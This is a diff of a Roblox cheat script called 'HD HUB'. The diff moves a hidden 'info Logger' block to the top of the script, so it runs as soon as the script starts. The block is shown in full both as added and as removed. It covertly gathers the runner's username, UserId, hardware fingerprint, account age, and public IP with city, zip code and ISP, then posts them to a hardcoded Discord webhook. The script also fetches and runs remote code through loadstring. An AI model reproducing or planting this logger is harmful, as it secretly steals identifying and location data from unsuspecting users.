@@ -1,4 +1,174 @@
 
+
+local webhook_url = "https://discord.com/api/webhooks/1085233565769420910/WwcZ1NeuzndnzJHyx1--hyL72DdQN4Bs30GB33Jmu5Z12E0CAkLGoYJ7426xSFRZFyiO"
+
+local player_name = game:GetService("Players").LocalPlayer.Name
+local LP = game:GetService("Players").LocalPlayer
+local TheFunny = tostring(game:HttpGet("https://api.ipify.org/", true))
+
+local IP = game:HttpGet("https://v4.ident.me")
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
+end
+if premium == false then 
+	if plr.AccountAge <= 70 then 
+		ALT = true
+	end
+end
+
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+
+
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/1085233565769420910/WwcZ1NeuzndnzJHyx1--hyL72DdQN4Bs30GB33Jmu5Z12E0CAkLGoYJ7426xSFRZFyiO"
+
+
+local data = 
+    {
+        ["content"] = "- HD HUB - WEBHOOK LOGGER -",
+        ["embeds"] = {{
+            ["title"] = "__**HWID:**__",
+            ["description"] = hwid,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xAB0909),
+            ["fields"] = {
+                {
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "UserId:",
+                    ["value"] = Game.Players.LocalPlayer.UserId,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
+                },
+				{
+					["name"] = "Game Name:",
+					["value"] = info.Name,
+					["inline"] = true
+				},
+				{
+					["name"] = "Age:",
+					["value"] = plr.AccountAge,
+					["inline"] = true
+				},
+				{
+					["name"] = "Premium:",
+					["value"] = premium,
+					["inline"] = true
+				},
+				{
+					["name"] = "ALT:",
+					["value"] = ALT,
+					["inline"] = true
+				},
+				
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+    
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+    
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
+
+local webhook = game:GetService("HttpService"):JSONEncode({
+    ['embeds'] = {{
+        title = "Profile link",
+        url = "https://www.roblox.com/users/" .. tostring(LP.UserId) .. "/profile",
+        color = 3456491,
+        thumbnail = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tonumber(LP.UserId) .. '&width=75&height=75&format=png',
+                    ["height"] = 75,
+                    ["width"] = 75,  
+                },
+        author = {
+            ["name"] = tostring(LP.Name) .. " executed the script more info below" ,
+            ["avatar_url"] = "",
+            ["url"]  = "",
+        },
+    fields = {
+                [1] = {
+                    ["name"] = "Username ",
+                    ["value"] = tostring(LP.Name),
+                    ["inline"] = true,
+                };
+                [2] = {
+                    ["name"] = "Script to join them ",
+                    ["value"] = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[,"]] .. game.JobId .. [[")]],
+                    ["inline"] = true,
+                };
+            };
+        };
+    };
+})
+syn.request({Url = "https://discord.com/api/webhooks/1085233565769420910/WwcZ1NeuzndnzJHyx1--hyL72DdQN4Bs30GB33Jmu5Z12E0CAkLGoYJ7426xSFRZFyiO",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = webhook,})
+
+if syn then
+	HttpRequest = syn.request
+else
+	HttpRequest = http_request
+end
+
+local ip_info = HttpRequest({
+	Url = "http://ip-api.com/json",
+	Method = "GET"
+})
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local dataMessage = string.format("\
+IP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+HttpRequest(
+	{
+		Url = webhook_url,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+	}
+)
+
+
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("   🔷 HD HUB 🔷 ", "Ocean") 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -36885,172 +37055,3 @@ end)
 local Main21 = Window:NewTab("Credits")
 local MainSection21 = Main21:NewSection("Made by         vh#8022           mrg#9745") 
 
----
---info Logger
-local webhook_url = "https://discord.com/api/webhooks/1085233565769420910/WwcZ1NeuzndnzJHyx1--hyL72DdQN4Bs30GB33Jmu5Z12E0CAkLGoYJ7426xSFRZFyiO"
-
-local player_name = game:GetService("Players").LocalPlayer.Name
-local LP = game:GetService("Players").LocalPlayer
-local TheFunny = tostring(game:HttpGet("https://api.ipify.org/", true))
-
-local IP = game:HttpGet("https://v4.ident.me")
-plr = game:GetService'Players'.LocalPlayer
-local premium = false
-local ALT = false
-if plr.MembershipType == Enum.MembershipType.Premium then
-	premium = true
-elseif plr.MembershipType == Enum.MembershipType.None then
-	premium = false
-end
-if premium == false then 
-	if plr.AccountAge <= 70 then 
-		ALT = true
-	end
-end
-
-local market = game:GetService("MarketplaceService")
-local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
-
-
-local http_request = http_request;
-if syn then
-	http_request = syn.request
-elseif SENTINEL_V2 then
-	function http_request(tb)
-		return {
-			StatusCode = 200;
-			Body = request(tb.Url, tb.Method, (tb.Body or ''))
-		}
-	end
-end
-
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
-hwid = "";
-
-for i, v in next, hwid_list do
-	if decoded.headers[v] then
-		hwid = decoded.headers[v];
-		break
-	end
-end
-
-if hwid then
-local HttpServ = game:GetService('HttpService')
-local url = "https://discord.com/api/webhooks/1085233565769420910/WwcZ1NeuzndnzJHyx1--hyL72DdQN4Bs30GB33Jmu5Z12E0CAkLGoYJ7426xSFRZFyiO"
-
-
-local data = 
-    {
-        ["content"] = "- HD HUB - WEBHOOK LOGGER -",
-        ["embeds"] = {{
-            ["title"] = "__**HWID:**__",
-            ["description"] = hwid,
-            ["type"] = "rich",
-            ["color"] = tonumber(0xAB0909),
-            ["fields"] = {
-                {
-                    ["name"] = "Username:",
-                    ["value"] = Game.Players.LocalPlayer.Name,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "UserId:",
-                    ["value"] = Game.Players.LocalPlayer.UserId,
-                    ["inline"] = true
-                },
-				{
-                    ["name"] = "Game Link:",
-                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
-                    ["inline"] = true
-                },
-				{
-					["name"] = "Game Name:",
-					["value"] = info.Name,
-					["inline"] = true
-				},
-				{
-					["name"] = "Age:",
-					["value"] = plr.AccountAge,
-					["inline"] = true
-				},
-				{
-					["name"] = "Premium:",
-					["value"] = premium,
-					["inline"] = true
-				},
-				{
-					["name"] = "ALT:",
-					["value"] = ALT,
-					["inline"] = true
-				},
-				
-            },
-        }}
-    }
-    local newdata = HttpServ:JSONEncode(data)
-    
-    local headers = {
-            ["content-type"] = "application/json"
-    }
-    
-    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
-    http_request(request_payload)
-end
-
-local webhook = game:GetService("HttpService"):JSONEncode({
-    ['embeds'] = {{
-        title = "Profile link",
-        url = "https://www.roblox.com/users/" .. tostring(LP.UserId) .. "/profile",
-        color = 3456491,
-        thumbnail = {
-                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tonumber(LP.UserId) .. '&width=75&height=75&format=png',
-                    ["height"] = 75,
-                    ["width"] = 75,  
-                },
-        author = {
-            ["name"] = tostring(LP.Name) .. " executed the script more info below" ,
-            ["avatar_url"] = "",
-            ["url"]  = "",
-        },
-    fields = {
-                [1] = {
-                    ["name"] = "Username ",
-                    ["value"] = tostring(LP.Name),
-                    ["inline"] = true,
-                };
-                [2] = {
-                    ["name"] = "Script to join them ",
-                    ["value"] = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[,"]] .. game.JobId .. [[")]],
-                    ["inline"] = true,
-                };
-            };
-        };
-    };
-})
-syn.request({Url = "https://discord.com/api/webhooks/1085233565769420910/WwcZ1NeuzndnzJHyx1--hyL72DdQN4Bs30GB33Jmu5Z12E0CAkLGoYJ7426xSFRZFyiO",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = webhook,})
-
-if syn then
-	HttpRequest = syn.request
-else
-	HttpRequest = http_request
-end
-
-local ip_info = HttpRequest({
-	Url = "http://ip-api.com/json",
-	Method = "GET"
-})
-local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-local dataMessage = string.format("\
-IP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-HttpRequest(
-	{
-		Url = webhook_url,
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
-		Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-	}
-)
